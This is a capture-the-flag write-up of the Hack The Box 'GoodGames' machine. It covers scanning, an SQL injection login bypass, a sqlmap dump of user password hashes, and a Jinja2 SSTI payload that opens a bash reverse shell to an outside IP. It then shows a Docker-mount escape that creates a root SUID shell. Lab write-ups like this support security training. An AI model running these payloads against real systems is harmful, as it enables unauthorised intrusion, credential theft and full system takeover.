---
title: "HTB Goodgames Writeup"
date: 2022-03-14T12:47:47+05:30
draft: false
tags: ['Linux', 'Easy', 'Docker', 'SUID', 'SQL', 'SSTI']
categories: ['Linux Easy']
---


# Process 
*   Add goodgames.htb to your `/etc/hosts`
*	Carried out the nmap scan 
	*	Found: `80/tcp open  ssl/http Werkzeug/2.0.2 Python/3.9.2`
*	Carried out Nikto scan in the background along with the directory enumeration using ffuf
	*	Information found not useful
*	Found an icon for user profile on top-right corner of the webpage
	*	Registered a user: babayaga
*	Tried different vectors upon successful registeration and login with babayaga but didn't found anything useful
*	Logged out of babayaga
	*	Captured a login request using Burp proxy, sent it to Repeater.
	*	Tried different SQL injection payloads in email parameter
	*	`admin' OR 1=1 -- -` worked
*	Upon confirmation of SQLi, the request was saved to a file and SQLMap was used for exploitation
	*	Firstly, databases were enumerated.
		*	Then out of two database 'main' was selected
	*	Secondly, the tables were enumerated
		*	Then, the table 'user' was selected and the entries were dumped
	*	The dumped entries containing the admin's hashed password.
*	Logged in as admin and found an icon on the top right corner redirecting to FLASK Volt dashboard on subdomain internal-administration.goodgames.htb
*	Reused the credentials previously obtained using sqlmap to login
*	Explored the dashboard, no functionality present other than form to update profile
*	Checked for SSTI (as it was using flask)
	*	Payload used: `{{7*7}}`
	*	Verdict: Vulnerable to SSTI
*	Leveraged SSTI to get a reverse shell
*	Found user flag in `/home/augustus/user.txt`
*	The reverse shell was obtained in a docker container with the user being root. 
*	Started a python webserver on host machine and download the deepce.sh script using wget
*	Executed deepce.sh script
	*	Found /home/augustus mounted on the docker container
	*	It can be the reason the owner of user.txt is 1000 rather than augustus
	*	It also reported another IP 172.19.0.1 in the subnet 172.19.0.2/24
	*	Carried out a port scan using a simple bash script found 22/tcp and 80/tcp to be opened
	*	Logged in as augustus using ssh and reused the password
*	Upon logging in, found that the deepce script was still owned by root and retained the assigned permission
*	It provided a way to escalate privilege by copying `/bin/bash` to `/home/augustus/` and changing permissions to 4777 from the docker container effectively creating an SUID exploit


## Enumeration

### Nmap scan
*	 Results corroborated by masscan
```bash
sudo nmap -A -sC -Pn goodgames.htb -T4 -oN nmap.adc
[sudo] password for babayaga: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-10 23:49 IST
Nmap scan report for goodgames.htb (10.129.154.80)
Host is up (0.17s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE  VERSION
80/tcp open  ssl/http Werkzeug/2.0.2 Python/3.9.2
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
|_http-title: GoodGames | Community and Store
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=3/10%OT=80%CT=1%CU=30806%PV=Y%DS=2%DC=T%G=Y%TM=622A415
OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=2%ISR=106%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1
OS:1NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   163.86 ms 10.10.14.1
2   163.92 ms goodgames.htb (10.129.154.80)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.13 seconds
```



## http{?:}//goodgames.htb

### Webpage
{{<figure src="/images/goodgames/Webpage.png" title="Webpage">}}

### Nikto Scan
```bash
nikto -host http://goodgames.htb
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.129.154.80
+ Target Hostname:    goodgames.htb
+ Target Port:        80
+ Start Time:         2022-03-10 23:54:43 (GMT5.5)
---------------------------------------------------------------------------
+ Server: Werkzeug/2.0.2 Python/3.9.2
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Server banner has changed from 'Werkzeug/2.0.2 Python/3.9.2' to 'Apache/2.4.51 (Debian)' which may suggest a WAF, load balancer or proxy is in place
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Uncommon header 'content-disposition' found, with contents: inline; filename=favicon.png
+ /goodgames.htb.pem: Potentially interesting archive/cert file found.
+ /goodgames.htb.pem: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
+ /goodgames.tar: Potentially interesting archive/cert file found.
.
.
> `JUNK RESPONSE TO JUNK REQUEST OMMITTED`
.
.
+ /goodgames.egg: Potentially interesting archive/cert file found.
+ /goodgames.egg: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
+ /goodgames_htb.tgz: Potentially interesting archive/cert file found.
+ /goodgames_htb.tgz: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
+ Allowed HTTP Methods: HEAD, OPTIONS, GET 
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-44056: /sips/sipssys/users/a/admin/user: SIPS v0.2.2 allows user account info (including password) to be retrieved remotely.
+ OSVDB-3092: /bin/: This might be interesting...
```



### DirEnum
*   Wordlist: /dirb/common.txt
```bash
ffuf -u http://goodgames.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt -c -e .php,.html,.txt -c -of md -o gobuster.common -fs 9265

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://goodgames.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .php .html .txt 
 :: Output file      : gobuster.common
 :: File format      : md
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 9265
________________________________________________

                        [Status: 200, Size: 85107, Words: 29274, Lines: 1735]
blog                    [Status: 200, Size: 44212, Words: 15590, Lines: 909]
forgot-password         [Status: 200, Size: 32744, Words: 10608, Lines: 730]
login                   [Status: 200, Size: 9294, Words: 2101, Lines: 267]
logout                  [Status: 302, Size: 208, Words: 21, Lines: 4]
profile                 [Status: 200, Size: 9267, Words: 2093, Lines: 267]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10]
signup                  [Status: 200, Size: 33387, Words: 11042, Lines: 728]
:: Progress: [18456/18456] :: Job [1/1] :: 228 req/sec :: Duration: [0:01:25] :: Errors: 0 ::
```



### Registering User
Credentials
=>ID: baba@goodgames.htb
=> Nickname: baba
=>password: babayaga

### SQL Injection
{{<figure src="/images/goodgames/sqlinjection.png" title="SQLi">}}




### SQLMAP 
```bash
┌─[babayaga@babayaga-virtualbox]─[~/Desktop/HTB/Linux/GoodGames]
└──╼ $sqlmap -r sql.req -D main -T user --dump
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.5.12#stable}
|_ -| . ["]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 06:42:37 /2022-03-11/

[06:42:37] [INFO] parsing HTTP request from 'sql.req'
[06:42:37] [INFO] resuming back-end DBMS 'mysql' 
[06:42:37] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=admin@g' AND (SELECT 3438 FROM (SELECT(SLEEP(5)))CGuJ) AND 'EDkT'='EDkT&password=asdf

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: email=admin@g' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7178717071,0x78646d59516d755669565765504650446b48616178556e53764c514870784673454c544143556b4c,0x71706b6a71)-- -&password=asdf
---
[06:42:38] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[06:42:38] [INFO] fetching columns for table 'user' in database 'main'
got a refresh intent (redirect like response common to login pages) to '/profile'. Do you want to apply it from now on? [Y/n] n
[06:42:41] [INFO] fetching entries for table 'user' in database 'main'
[06:42:41] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[06:42:50] [INFO] writing hashes to a temporary file '/tmp/sqlmaps_wjqdle74903/sqlmaphashes-aem5wjwr.txt' 
do you want to crack them via a dictionary-based attack? [Y/n/q] n
Database: main
Table: user
[2 entries]
+----+-------+---------------------+----------------------------------+
| id | name  | email               | password                         |
+----+-------+---------------------+----------------------------------+
| 1  | admin | admin@goodgames.htb | 2b-finditonyourown-7e7cb8ec |
| 2  | baba  | baba@goodgames.htb  | 432d3e19c9fcec7489892249118485c9 |
+----+-------+---------------------+----------------------------------+

[06:42:57] [INFO] table 'main.`user`' dumped to CSV file '/home/babayaga/.local/share/sqlmap/output/goodgames.htb/dump/main/user.csv'
[06:42:57] [INFO] fetched data logged to text files under '/home/babayaga/.local/share/sqlmap/output/goodgames.htb'

[*] ending @ 06:42:57 /2022-03-11/
```

### Cracking hash


=> Hash: 2b-finditonyourown-7e7cb8ec
=> Type: md5
=> Value: su-finditonyourown-or

### Logging in as admin
{{<figure src="/images/goodgames/new-option.png" title="Link to new subdomain">}}





## http{?:}//int-finditownyourown-tor.goodgames.htb

### Webpage
{{<figure src="/images/goodgames/new-option.png" title="Flask Dashboard Login Page">}}

Reusing the previous credentials

### Authenticated
{{<figure src="/images/goodgames/subdomain-webpage.png" title="Logged in as admin">}}

### SSTI
*   Found when updating profile under settings
[A Pentester’s Guide to Server Side Template Injection (SSTI) | Cobalt Blog](https://cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti)


```text
Payload: {{7*7}}
```

{{<figure src="/images/goodgames/ssti.png" title="SSTI">}}



## Foothold

### Reverse Shell

```text
Payload: 
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('bash -c "/bin/bash -l > /dev/tcp/10.10.14.103/4242 0<&1 2>&1"').read() }}
```

{{<figure src="/images/goodgames/revshell.png" title="Reverse Shell">}}

### UserFlag
{{<figure src="/images/goodgames/userflag.png" title="User Flag">}}
```bash
root@3a453ab39d3d:/home/augustus# cat user.txt
432192a125f3c3728c0ce56b8c2513bf
```

## Privilege Escalation

### Docker Escape

```bash
oot@3a453ab39d3d:/home/augustus# ll
total 24
drwxr-xr-x 2 1000 1000 4096 Dec  2 23:51 .
drwxr-xr-x 1 root root 4096 Nov  5 15:23 ..
lrwxrwxrwx 1 root root    9 Nov  3 10:16 .bash_history -> /dev/null
-rw-r--r-- 1 1000 1000  220 Oct 19 11:16 .bash_logout
-rw-r--r-- 1 1000 1000 3526 Oct 19 11:16 .bashrc
-rw-r--r-- 1 1000 1000  807 Oct 19 11:16 .profile
-rw-r----- 1 1000 1000   33 Mar 12 04:43 user.txt
root@3a453ab39d3d:/home/augustus# cat user.txt
432192a125f3c3728c0ce56b8c2513bf
```

### Deepce Output

```bash

                      ##         .
                ## ## ##        ==
             ## ## ## ##       ===
         /"""""""""""""""""\___/ ===
    ~~~ {~~ ~~~~ ~~~ ~~~~ ~~~ ~ /  ===- ~~~
         \______ X           __/
           \    \         __/
            \____\_______/
          __
     ____/ /__  ___  ____  ________
    / __  / _ \/ _ \/ __ \/ ___/ _ \   ENUMERATE
   / /_/ /  __/  __/ /_/ / (__/  __/  ESCALATE
   \__,_/\___/\___/ .___/\___/\___/  ESCAPE
                 /_/

 Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)
 by stealthcopter

==================================( Colors )===================================
[+] Exploit Test ............ Exploitable - Check this out
[+] Basic Test .............. Positive Result
[+] Another Test ............ Error running check
[+] Negative Test ........... No
[+] Multi line test ......... Yes
Command output
spanning multiple lines

Tips will look like this and often contains links with additional info. You can usually 
ctrl+click links in modern terminal to open in a browser window
See https://stealthcopter.github.io/deepce

=============================( Enumerating Platform )=============================
[+] Inside Container ........ Yes
[+] Container Platform ...... docker
[+] Container tools ......... None
[+] User .................... root
[+] Groups .................. root
[+] Docker Executable ....... Not Found
[+] Docker Sock ............. Not Found
[+] Docker Version .......... Version Unknown
===========================( Enumerating Container )==============================
[+] Container ID ............ 3a453ab39d3d
[+] Container Full ID ....... 3a453ab39d3df444e9b33e4c1d9f2071827b3b7b20a8d3357b7754a84b06685f
[+] Container Name .......... Could not get container name through reverse DNS
[+] Container IP ............ 172.19.0.2 
[+] DNS Server(s) ........... 127.0.0.11 
[+] Host IP ................. 172.19.0.1
[+] Operating System ........ GNU/Linux
[+] Kernel .................. 4.19.0-18-amd64
[+] Arch .................... x86_64
[+] CPU ..................... Intel(R) Xeon(R) Gold 5218 CPU @ 2.30GHz
[+] Useful tools installed .. Yes
/usr/bin/curl
/usr/bin/wget
/usr/bin/gcc
/bin/hostname
/usr/local/bin/python
/usr/bin/python2
/usr/local/bin/python3
[+] Dangerous Capabilities .. Unknown (capsh not installed)
[+] SSHD Service ............ No
[+] Privileged Mode ......... No
====================================( Enumerating Mounts )====================================
[+] Docker sock mounted ....... No
[+] Other mounts .............. Yes
/home/augustus /home/augustus rw,relatime - ext4 /dev/sda1 rw,errors=remount-ro
[+] Possible host usernames ... augustus rw,relatime - ext4  
===============================( Interesting Files)===============================
[+] Interesting environment variables ... No
[+] Any common entrypoint files ......... No
[+] Interesting files in root ........... No
[+] Passwords in common files ........... No
[+] Home directories .................... total 4.0K
drwxr-xr-x 2 1000 1000 4.0K Mar 13 10:45 augustus
[+] Hashes in shadow file ............... No permissions
[+] Searching for app dirs .............. 
==========================( Enumerating Containers )============================
By default containers can communicate with other containers on the same network and the 
host machine, this can be used to enumerate further

[+] Attempting ping sweep of 172.19.0.2 /24 (ping) 
172.19.0.1 is Up
172.19.0.2 is Up
==================================================================================

```


### Script for port scanning
```bash
#!/bin/bash
hostname=192.168.0.1     #ip address of machine you want to scan
for port in {1..65535};do
2>/dev/null echo > /dev/tcp/$hostname/$port
if [ $? == 0 ]
 then
 {
 echo " $port is open"
 }
fi
done
```


### Open Ports
```bash
root@3a453ab39d3d:/home/augustus# ./BashPortScan.sh 
 22 is open
 80 is open
```

### Logging in as Augustus
Reusing the credentials
{{<figure src="/images/goodgames/sshToaugustus.png" title="Reusing credentials to log in augustus from the Docker Container">}}

### Creating an SUID
Preserved permision
```bash
auguaugustus@GoodGames:~$ cp /bin/bash .
augustus@GoodGames:~$ ls -la
total 1280
drwxr-xr-x 3 augustus augustus    4096 Mar 13 11:18 .
drwxr-xr-x 3 root     root        4096 Oct 19 12:16 ..
-rwxr-xr-x 1 augustus augustus 1234376 Mar 13 11:18 bash
lrwxrwxrwx 1 root     root           9 Nov  3 10:16 .bash_history -> /dev/null
-rw-r--r-- 1 augustus augustus     220 Oct 19 12:16 .bash_logout
-rwxr-xr-x 1 root     root         203 Mar 13 10:48 BashPortScan.sh
-rw-r--r-- 1 augustus augustus    3526 Oct 19 12:16 .bashrc
-rwxr-xr-x 1 root     root       38197 Mar 12 05:41 deepce.sh
drwxr-xr-x 3 augustus augustus    4096 Mar 13 11:03 .local
-rw-r--r-- 1 augustus augustus     807 Oct 19 12:16 .profile
-rw-r----- 1 augustus augustus      33 Mar 13 10:31 user.txt

```

```bash
root@3a453ab39d3d:/home/augustus# chown root:root bash
root@3a453ab39d3d:/home/augustus# chmod 4777 bash
root@3a453ab39d3d:/home/augustus# ls -la
total 1280
drwxr-xr-x 3 1000 1000    4096 Mar 13 11:18 .
drwxr-xr-x 1 root root    4096 Nov  5 15:23 ..
lrwxrwxrwx 1 root root       9 Nov  3 10:16 .bash_history -> /dev/null
-rw-r--r-- 1 1000 1000     220 Oct 19 11:16 .bash_logout
-rw-r--r-- 1 1000 1000    3526 Oct 19 11:16 .bashrc
drwxr-xr-x 3 1000 1000    4096 Mar 13 11:03 .local
-rw-r--r-- 1 1000 1000     807 Oct 19 11:16 .profile
-rwxr-xr-x 1 root root     203 Mar 13 10:48 BashPortScan.sh
-rwsrwxrwx 1 root root 1234376 Mar 13 11:18 bash
-rwxr-xr-x 1 root root   38197 Mar 12 05:41 deepce.sh
-rw-r----- 1 1000 1000      33 Mar 13 10:31 user.txt
```


```bash
augustus@GoodGames:~$ ls
bash  BashPortScan.sh  deepce.sh  user.txt
augustus@GoodGames:~$ ./bash -p
bash-5.1# ls
bash  BashPortScan.sh  deepce.sh  user.txt
bash-5.1# cd /root
bash-5.1# ls
root.txt
bash-5.1# cat root.txt
0947410d4307a343a212814f96f507db
bash-5.1# 
```
